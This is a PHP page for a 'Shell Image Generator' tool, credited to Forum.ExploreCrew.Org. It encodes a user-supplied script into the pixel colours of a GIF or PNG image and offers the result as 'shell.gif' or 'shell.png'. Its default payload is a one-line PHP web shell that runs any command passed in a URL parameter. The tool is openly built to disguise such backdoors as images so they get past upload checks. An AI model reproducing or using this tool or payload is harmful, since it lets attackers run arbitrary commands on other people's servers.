<?php include("../../header.php"); ?>
<div class="main-panel">
  <div class="content-wrapper">
    <div class="page-header">
      <h3 class="page-title"> Title </h3>
      <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
          <li class="breadcrumb-item"><a href="#">category</a></li>
          <li class="breadcrumb-item active" aria-current="page">title</li>
        </ol>
      </nav>
    </div>
    <div class="content">
  <h2 class="text-center">Shell Image Generator</h2>
  <div class="tile">
    <div class="col-md-12">
        <?php
        error_reporting(0);
        sessions_start();
        if(isset($_POST['scripts']))
        {
        if((strlen($_POST['scripts']) > 20) && (strlen($_POST['scripts']) < 10000))
        {
        @$_SESSION["scripts"] = base64_encode(@$_POST['scripts']);
        @$_SESSION["image"] = $_POST['image'];
        header("Location: ?set");
        }else{
        die('
        <script type="text/javascript">
        alert("minlength:20 and maxlength:10000")
        window.location = "?";
        </script>'
        );
        }
        }

        if(isset($_POST['reset']))
        {
        $_SESSION["scripts"] = base64_encode("<?php\r\n#min:20 max:10000 \r\nsystem(\$_GET['x']) ;\r\n?>");
        $_SESSION["image"] = "jpg";
        header("Location: ?null");
        }


        $string = @base64_decode(@$_SESSION['scripts']);
        $imageExt = trim(strtolower(@$_SESSION['image']));

        if(isset($_GET['preview']))
        {
        $string = "\r\n".$string."\r\n<!-- \r\n\r\nShell Image Generator by Forum.ExploreCrew.Org\r\n\r\n";
        ;
        $px = ((int)(strlen($string) / 3));
        $arr_string = str_split($string,$px);
        $im = @imagecreate(($px),($px)) or die("Cannot Initialize new GD image stream");
        $arrString = array();
        for($h = 0; $h < ($px); $h++)
        {
        $arrString = @$arr_string[$h];
        $current = 0;
        for($w = 0; $w < ($px); $w++)
        {
        if((@$arrString[$current + 0] != '') && (@$arrString[$current + 1] != '') && (@
        $arrString[$current + 2] != ''))
        {
        $color_r = dechex(ord(@$arrString[$current + 0]));
        $color_g = dechex(ord(@$arrString[$current + 1]));
        $color_b = dechex(ord(@$arrString[$current + 2]));
        $current = $current + 3;

        $color = @imagecolorallocate($im,"0x$color_r","0x$color_g","0x$color_b");
        imagesetpixel($im,$w,$h,$color);
        }
        }
        }

        //header("Content-Type: image/png");
        switch(trim($imageExt))
        {
        case "gif":
        imagegif($im,null);
        break;
        case "png":
        imagepng($im,null);
        break;
        }

        if(isset($_GET['download']))
        {
        header('Content-Disposition: attachment; filename="shell.'.$imageExt.'"');
        }

        imagedestroy($im);
        die();
        }
        $download = sha1(rand(0,999)).'.'.$imageExt;

        echo '<form method="post" action="" enctype="multipart/form-data">';
        echo '<fieldset>';
        echo '<div><label for="scripts">Yours Scripts</label><textarea name="scripts" id="scripts" class="form-control" maxlength="10000">'.
        htmlentities($string).'</textarea></div>';
        echo '<div>';
        echo '<label for="image">Mime Type</label>';
        echo '<select size="1" class="form-control" name="image">';
        echo '<option value="gif">image/gif</option>';
        echo '<option value="png">image/png</option>';
        echo '</select>';
        echo '</div>';
        echo '<div><input type="submit" class="btn btn-block" value="Reset" name="reset" id="generate"/><input type="submit" value="Generate" name="generate" class="btn btn-block" id="generate"/></div>';
        echo '</fieldset>';
        echo '</form>';
        echo '<fieldset>';
        echo '<legend>YOUR SHELL IMAGE</legend>';
        echo '<div></div>';
        echo '<div><a href="?preview='.$download.'&download">Download</a></div>';
        echo '</fieldset>';
        ?>




            </div>
          </div>
        </div>
  </div>
      </div>
        </div>
<?php include("../../footer.php"); ?>
          <!-- partial -->
        </div>
        <!-- main-panel ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
    <!-- container-scroller -->
    <!-- plugins:js -->
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script src="../../assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="../../assets/js/off-canvas.js"></script>
    <script src="../../assets/js/hoverable-collapse.js"></script>
    <script src="../../assets/js/misc.js"></script>
    <script src="../../assets/js/settings.js"></script>
    <script src="../../assets/js/todolist.js"></script>
    <!-- endinject -->
  </body>
</html>
